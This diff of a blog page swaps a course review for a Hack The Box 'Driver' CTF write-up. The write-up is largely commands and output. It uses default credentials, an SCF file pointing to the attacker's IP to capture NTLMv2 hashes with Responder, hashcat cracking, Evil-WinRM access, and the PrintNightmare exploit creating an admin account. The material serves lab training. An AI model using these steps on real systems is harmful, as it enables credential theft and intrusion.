@@ -11,7 +11,7 @@
 
 
 
-    <title>CRTP Review</title>
+    <title>Driver Write Up</title>
     <meta name="HandheldFriendly" content="True" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <!-- Styles'n'Scripts -->
@@ -36,30 +36,30 @@
     <!-- This tag outputs SEO meta+structured data and other important settings -->
     <meta name="description" content="Infosec | Hacking | CTF" />
     <link rel="shortcut icon" href="https://darrynbrownfield.co.uk/assets/images/favicon.png" type="image/png" />
-    <link rel="canonical" href="https://darrynbrownfield.co.uk/crtp" />
+    <link rel="canonical" href="https://darrynbrownfield.co.uk/driver" />
     <meta name="referrer" content="no-referrer-when-downgrade" />
 
      <!--title below is coming from _includes/dynamic_title-->
     <meta property="og:site_name" content="Darryn Brownfield" />
     <meta property="og:type" content="website" />
-    <meta property="og:title" content="CRTP Review" />
-    <meta property="og:description" content="I have recently completed the Attacking and Defending Active Directory course from Pentester Academy and wanted to share my thoughts for anyone looking to take the course and take the CTRP exam. The course is very beginner friendly, no prior knowledge of attacking active directory or using PowerShell is required." />
-    <meta property="og:url" content="https://darrynbrownfield.co.uk/crtp" />
-    <meta property="og:image" content="https://darrynbrownfield.co.uk/assets/images/crtp/cover.png" />
+    <meta property="og:title" content="Driver Write Up" />
+    <meta property="og:description" content="Overview Driver is a easy box from Hack The Box, demonstrating the impact of the Windows PrintNightmare vulnerability and also I learnt about SCF files. This was a new attack vector for me. Nmap I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan" />
+    <meta property="og:url" content="https://darrynbrownfield.co.uk/driver" />
+    <meta property="og:image" content="https://darrynbrownfield.co.uk/assets/images/driver/cover.png" />
     <meta property="article:publisher" content="https://www.facebook.com/" />
     <meta property="article:author" content="https://www.facebook.com/" />
-    <meta property="article:published_time" content="2021-10-25T00:00:00+00:00" />
-    <meta property="article:modified_time" content="2021-10-25T00:00:00+00:00" />
-    <meta property="article:tag" content="Review" />
+    <meta property="article:published_time" content="2022-02-27T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2022-02-27T00:00:00+00:00" />
+    <meta property="article:tag" content="Hackthebox" />
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="CRTP Review" />
-    <meta name="twitter:description" content="I have recently completed the Attacking and Defending Active Directory course from Pentester Academy and wanted to share my thoughts for anyone looking to take the course and take the CTRP exam. The course is very beginner friendly, no prior knowledge of attacking active directory or using PowerShell is required." />
+    <meta name="twitter:title" content="Driver Write Up" />
+    <meta name="twitter:description" content="Overview Driver is a easy box from Hack The Box, demonstrating the impact of the Windows PrintNightmare vulnerability and also I learnt about SCF files. This was a new attack vector for me. Nmap I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan" />
     <meta name="twitter:url" content="https://darrynbrownfield.co.uk/" />
-    <meta name="twitter:image" content="https://darrynbrownfield.co.uk/assets/images/crtp/cover.png" />
+    <meta name="twitter:image" content="https://darrynbrownfield.co.uk/assets/images/driver/cover.png" />
     <meta name="twitter:label1" content="Written by" />
     <meta name="twitter:data1" content="Darryn Brownfield" />
     <meta name="twitter:label2" content="Filed under" />
-    <meta name="twitter:data2" content="Review" />
+    <meta name="twitter:data2" content="Hackthebox" />
     <meta name="twitter:site" content="@dazbrownfield" />
     <meta name="twitter:creator" content="@dazbrownfield" />
     <meta property="og:image:width" content="1400" />
@@ -74,18 +74,18 @@
         "name": "Darryn Brownfield",
         "logo": "https://darrynbrownfield.co.uk/assets/images/blog-icon.png"
     },
-    "url": "https://darrynbrownfield.co.uk/crtp",
+    "url": "https://darrynbrownfield.co.uk/driver",
     "image": {
         "@type": "ImageObject",
-        "url": "https://darrynbrownfield.co.uk/assets/images/crtp/cover.png",
+        "url": "https://darrynbrownfield.co.uk/assets/images/driver/cover.png",
         "width": 2000,
         "height": 666
     },
     "mainEntityOfPage": {
         "@type": "WebPage",
-        "@id": "https://darrynbrownfield.co.uk/crtp"
+        "@id": "https://darrynbrownfield.co.uk/driver"
     },
-    "description": "I have recently completed the Attacking and Defending Active Directory course from Pentester Academy and wanted to share my thoughts for anyone looking to take the course and take the CTRP exam. The course is very beginner friendly, no prior knowledge of attacking active directory or using PowerShell is required."
+    "description": "Overview Driver is a easy box from Hack The Box, demonstrating the impact of the Windows PrintNightmare vulnerability and also I learnt about SCF files. This was a new attack vector for me. Nmap I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan"
 }
     </script>
 
@@ -98,7 +98,7 @@
     </script> -->
 
     <meta name="generator" content="Jekyll 3.6.2" />
-    <link rel="alternate" type="application/rss+xml" title="CRTP Review" href="/feed.xml" />
+    <link rel="alternate" type="application/rss+xml" title="Driver Write Up" href="/feed.xml" />
 
 
 </head>
@@ -206,100 +206,258 @@ into the {body} of the default.hbs template -->
 <main id="site-main" class="site-main outer" role="main">
     <div class="inner">
 
-        <article class="post-full  tag-review tag-crtp tag-ad post ">
+        <article class="post-full  tag-hackthebox tag-ctf tag-easy post ">
 
             <header class="post-full-header">
                 <section class="post-full-meta">
-                    <time class="post-full-meta-date" datetime="25 October 2021">25 October 2021</time>
+                    <time class="post-full-meta-date" datetime="27 February 2022">27 February 2022</time>
                     
                         <span class="date-divider">/</span>
                         
                             
-                               <a href='/tag/review/'>REVIEW</a>,
+                               <a href='/tag/hackthebox/'>HACKTHEBOX</a>,
                             
                         
                             
-                               <a href='/tag/crtp/'>CRTP</a>,
+                               <a href='/tag/ctf/'>CTF</a>,
                             
                         
                             
-                               <a href='/tag/ad/'>AD</a>
+                               <a href='/tag/easy/'>EASY</a>
                             
                         
                     
                 </section>
-                <h1 class="post-full-title">CRTP Review</h1>
+                <h1 class="post-full-title">Driver Write Up</h1>
             </header>
 
             <section class="post-full-content">
                 <div class="kg-card-markdown">
-                    <p><img src="/assets/images/crtp/cover1.png" alt="cover" /></p>
+                    <p><img src="/assets/images/driver/cover.png" alt="cover" /></p>
 
-<p>I have recently completed the <a href="https://www.pentesteracademy.com/activedirectorylab">Attacking and Defending Active Directory</a> course from Pentester Academy and wanted to share my thoughts for anyone looking to take the course and take the CTRP exam.</p>
+<h3 id="overview">Overview</h3>
 
-<p>The course is very beginner friendly, no prior knowledge of attacking active directory or using PowerShell is required. However, I do recommend understanding the basis before the course. Resources like <a href="https://tryhackme.com">TryHackMe</a> will provide a good overview of basic terminology, privilege escalation and reverse shells etc. At a high-level the course covers:</p>
+<p><a href="https://app.hackthebox.com/machines/Driver">Driver</a> is a easy box from <a href="https://hackthebox.com">Hack The Box</a>, demonstrating the impact of the Windows PrintNightmare vulnerability and also I learnt about SCF files. This was a new attack vector for me.</p>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan to check the available ports.</p>
+
+<pre><code class="language-highlight">└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.11.106
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:20 GMT
+Nmap scan report for 10.10.11.106
+Host is up (0.020s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE      VERSION
+80/tcp  open  http         Microsoft IIS httpd 10.0
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+135/tcp open  msrpc        Microsoft Windows RPC
+445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-02-28T00:20:49
+|_  start_date: 2022-02-27T04:55:51
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds
+</code></pre>
+
+<p>3 Ports open:</p>
 
 <ul>
-  <li>Domain Enumeration</li>
-  <li>Local Privilege Escalation</li>
-  <li>Lateral Movement</li>
-  <li>Domain Persistence</li>
-  <li>Domain Privilege Escalation</li>
-  <li>Cross-Forest Attacks</li>
-  <li>Forest Persistence</li>
-  <li>Detection and Defense</li>
+  <li>80 - HTTP - Microsoft IIS httpd 10.0</li>
+  <li>135 - MSRPC - Microsoft Windows RPC</li>
+  <li>445 - SMB - Microsoft Windows 7 - 10 microsoft-ds</li>
 </ul>
 
-<p>As part of the course you get all the learning material and access to a AD lab to practice the attacks in a controlled environment. For the lab access you can choose 30, 60 or 90 days of access. I only took 30 days but I think this is plenty to cover all the material and complete the labs but of course it depends on the time you can spend on it. I would spend a few hours a couple of evenings a week and a good 4 or 5 hours on a weekend.</p>
+<p>I also ran a full port scan and found winrm to be open on port 5985.</p>
 
-<h3 id="the-course">The Course</h3>
+<pre><code class="language-highlight">└──╼ $sudo nmap -p- -oA nmap/all_ports 10.10.11.106
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:25 GMT
+Nmap scan report for 10.10.11.106
+Host is up (0.026s latency).
+Not shown: 65531 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+445/tcp  open  microsoft-ds
+5985/tcp open  wsman
+</code></pre>
 
-<p>Once you have registered you will receive access to a portal which provides:</p>
+<p>The web service is showing an unauthorized response however it could be leaking a username with the message “Please enter password for admin”.</p>
 
-<ul>
-  <li>Course videos</li>
-  <li>Course slides</li>
-  <li>Lab guide</li>
-  <li>Lab walk through videos</li>
-</ul>
+<h3 id="enumeration">Enumeration</h3>
 
-<p>You will also be asked when you wish to obtain access to the labs. I think this a great option as some people will prefer to watch everything then focus on the labs. However my methodology was:</p>
+<p>Before looking at the web service I tried enumerating SMB with various tools such as smbmap, smbclient and CrackMapExec however I had no joy.</p>
 
-<ul>
-  <li>Watch the video for a section</li>
-  <li>Read the section slides and notes</li>
-  <li>Complete the learning objective for that section</li>
-  <li>Watch the lab walk through</li>
-  <li>Repeat for the next section</li>
-</ul>
+<pre><code class="language-highlight">└──╼ $cme smb 10.10.11.106
+SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
+┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
+└──╼ $smbmap -H 10.10.11.106
+[!] Authentication error on 10.10.11.106
+</code></pre>
 
-<p>I preferred to do each section at a time and fully understand it before moving on to the next.</p>
+<p>So I turned my attention to the web service. Navigating to the IP I did get a login prompt. I tried admin:admin and got in!</p>
 
-<p>The course videos are good, I think they are missing some post production flare as its just the instructor with some slides and demos, however that being said the content (which is the important bit really) is fantastic. <a href="https://twitter.com/nikhil_mitt">Nikhil Mittal</a> clearly breaks down each subject and explains each attack and provides a demo of how it works.</p>
+<p><img src="/assets/images/driver/login.png" alt="login" /></p>
 
-<p>At the end of each learning section is a learning objective to complete in the labs. These are not like the OSCP labs, this environment is to be used with the learning material to try out each attack. Additionally, on the portal is a flag verification tab with questions, the answers are to be discovered whilst completing the labs. These aren’t like CTF hash flags but snippets of information such as ‘NTLM hash of UserX’. While completing the course I had no issues at all with the labs, they are shared with other students but this didn’t cause me any problems.</p>
+<p>Once logged in, I get a simple web page but an email address of ‘support@driver.htb’. I updated my host file with ‘driver.htb’ just in case I need it later.</p>
 
-<h3 id="the-exam">The Exam</h3>
+<p><img src="/assets/images/driver/homepage.png" alt="homepage" /></p>
 
-<p>The exam was fun! You are given 24 hours to enumerate and compromise a AD environment of 5 machines. You are provided with an additional machine to provide a foothold on to the network but that is it. No tools are on the machine, anything you want to use must be first copied over. After the 24 hour period you are given 48 hours to write up your findings and submit a report.</p>
+<p>The only link that works on the web page is ‘Firmware Updates’. This page provides an upload function. I played around with this for such a long time, trying attacks like XSS, uploading PHP shells but nothing worked.</p>
 
-<p>A couple of days before the exam started, I created the report template and read through all my notes from the course. I use Onenote for note taking, so I created a new section specifically for the exam with a sub section for each machine and some general sections for notes, credentials etc so I could quickly copy and paste details.</p>
+<p><img src="/assets/images/driver/upload.png" alt="upload" /></p>
 
-<p>I started the exam at around 11.30, by 15.00 I had managed to gain privesc on the foothold machine and compromise two others but then came hell, machine 3. I was stuck, for hours…… 11 hours later at 02.00 I decided I needed sleep and managed to sleep until 05.00. I was sure I knew how to compromise machines 4 and 5 based on the enumeration I had done but the machines needed to be done in order. However, at 05.30 I had access! I was completely overthinking it, having the break and stepping away allowed me to start again and look it with a fresh (but tired) pair of eyes. By 06.15 I was able to compromise the remaining machines.</p>
+<p>However re-reading the line:</p>
 
-<p>I went though and got all my notes and screenshots so I could create my write up and by 10.00 submitted my report. I got confirmation they received it and would get back to me with result. 6 days passed and then I finally I got the confirmation I passed!</p>
+<blockquote>
+  <p>Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.</p>
+</blockquote>
 
-<h3 id="final-thoughts">Final Thoughts</h3>
+<p>I decided to change my google search to “http smb file share exploit” and found an article on using SCF files.</p>
 
-<p>I highly recommend the course to anyone involved in attack or defending AD. From a offensive perspective the course gives a good understanding of some of the attacks available and hands on experience testing them and moving around a domain. From a defensive perspective, its a must! 30 days is plenty of time to complete all the material and the labs multiple times. The exam is tough but fair and as long as you understand all the course material you can pass the exam.</p>
+<h3 id="initial-access">Initial Access</h3>
 
-<p>Im proud to say I’m now CRTP!</p>
+<p>The first article that returned was from Penetration testing lab https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/. After reading the article I created the file test.scf using the example they provide and changed the IP to my VPN IP.</p>
 
-<p><img src="/assets/images/crtp/cert.png" alt="cover" /></p>
+<pre><code class="language-highlight">└──╼ $cat test.scf 
+[Shell]
+Command=2
+IconFile=\\10.10.14.11\share\pentestlab.ico
+[Taskbar]
+Command=ToggleDesktop
+</code></pre>
 
-<p>Thanks for reading!</p>
+<p>I started responder with the command ‘<code class="highlighter-rouge">sudo responder -I tun0</code>’.</p>
 
-<p>============================================================</p>
+<p>Then uploaded the file using the web upload function and got a hit from responder</p>
+
+<pre><code class="language-highlight">[SMB] NTLMv2-SSP Client   : 10.10.11.106
+[SMB] NTLMv2-SSP Username : DRIVER\tony
+[SMB] NTLMv2-SSP Hash     : tony::DRIVER:87ea6d299d14fa32:ED6355EFB0444E974805B3FF0E0B9B26:0101000000000000803021AB042CD801AE67B0D5B0D050060000000002000800350054003400480001001E00570049004E002D0
+0350032003700430037004C004F004F0030004300360004003400570049004E002D00350032003700430037004C004F004F003000430036002E0035005400340048002E004C004F00430041004C000300140035005400340048002E004C004F004
+30041004C000500140035005400340048002E004C004F00430041004C0007000800803021AB042CD80106000400020000000800300030000000000000000000000000200000C974CDC12A32C5BFD81B375A1DECF3BF2FF300E27CB3440A6AC953C
+7F84AACEA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000
+</code></pre>
+
+<p>I put the hash in to a file called ‘hash’ and used hashcat to crack it with the command <code class="highlighter-rouge">hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt</code>.</p>
+
+<p>Now I had a username and password I was able to use winrm to login. To login I used <a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>.</p>
+
+<pre><code class="language-highlight">└──╼ $/opt/evil-winrm/evil-winrm.rb -u tony -i 10.10.11.106
+Enter Password: 
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\tony\Documents&gt; 
+</code></pre>
+
+<h3 id="priv-esc">Priv Esc</h3>
+
+<p>Now I had a foothold, I did some basic enumeration of the box. Looking at the running services I could see the Windows print spooler service.</p>
+
+<pre><code class="language-highlight">    381      23     5164      14448 ...12            1128 spoolsv
+</code></pre>
+
+<p>This made me think of the PrintNightmare exploit. I could also have used rpcdump to find this.</p>
+
+<pre><code class="language-highlight">└──╼ $rpcdump.py 10.10.11.106 | egrep 'MS-RPRN|MS-PAR'
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
+Protocol: [MS-RPRN]: Print System Remote Protocol 
+</code></pre>
+
+<p>To exploit this I used the <a href="https://github.com/calebstewart/CVE-2021-1675">exploit</a> created by <a href="https://twitter.com/calebjstewart">Caleb Stewart</a> and <a href="https://twitter.com/_JohnHammond">John Hammond</a>.</p>
+
+<p>I used git to clone the repo in to my /opt directory.</p>
+
+<pre><code class="language-highlight">└──╼ $sudo git clone https://github.com/calebstewart/CVE-2021-1675.git
+Cloning into 'CVE-2021-1675'...
+remote: Enumerating objects: 40, done.
+remote: Counting objects: 100% (40/40), done.
+remote: Compressing objects: 100% (32/32), done.
+remote: Total 40 (delta 9), reused 37 (delta 6), pack-reused 0
+Receiving objects: 100% (40/40), 131.12 KiB | 932.00 KiB/s, done.
+Resolving deltas: 100% (9/9), done.
+┌─[daz@parrotos]─[/opt]
+└──╼ $cd CVE-2021-1675
+┌─[daz@parrotos]─[/opt/CVE-2021-1675]
+└──╼ $ls
+CVE-2021-1675.ps1  nightmare-dll  README.md
+</code></pre>
+
+<p>Now using Evil-WinRM I can upload the powershell script and execute it.</p>
+
+<pre><code class="language-highlight">*Evil-WinRM* PS C:\Users\tony\Documents&gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
+Info: Uploading /opt/CVE-2021-1675/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1
+
+                                                             
+Data: 238080 bytes of 238080 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\tony\Documents&gt; Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
+*Evil-WinRM* PS C:\Users\tony\Documents&gt; Invoke-Nightmare
+[+] using default new user: adm1n
+[+] using default new password: P@ssw0rd
+[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
+[+] added user  as local administrator
+[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
+</code></pre>
+
+<p>It worked! I canceled my current WinRM session and logged back in using the new credentials.</p>
+
+<pre><code class="language-highlight">*Evil-WinRM* PS C:\Users\tony\Documents&gt; exit
+
+Info: Exiting with code 0
+
+┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
+└──╼ $/opt/evil-winrm/evil-winrm.rb -u adm1n -i 10.10.11.106
+Enter Password: 
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\adm1n\Documents&gt; cd C:/Users/Administrator/Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        2/26/2022   8:56 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+
+</code></pre>
+
+<p>Thats the box, thanks for reading!</p>
+
+<p>==========================================================================</p>
 
 <p>Any comments or feedback welcome! You can find me on <a href="https://twitter.com/dazbrownfield">twitter</a>.</p>
 
